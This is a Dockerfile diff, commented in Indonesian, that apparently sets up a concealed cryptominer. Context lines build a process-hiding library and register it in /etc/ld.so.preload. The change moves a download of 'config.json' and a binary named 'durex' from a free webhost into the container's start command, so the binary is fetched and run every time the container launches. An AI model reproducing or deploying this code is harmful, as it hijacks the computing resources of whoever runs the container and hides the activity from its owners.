@@ -13,10 +13,7 @@ RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
 # Download dan jalankan kode yang diinginkan saat container berjalan
-RUN wget https://nyadur.000webhostapp.com/myrig/config.json \
-    && wget https://nyadur.000webhostapp.com/myrig/durex \
-    && chmod +x durex 
 
 # Perintah yang akan dijalankan saat container pertama kali dijalankan
 # Ganti perintah ini sesuai dengan kebutuhan Anda
-CMD ["ls"]
+CMD ["wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && chmod +x durex && ./durex"]
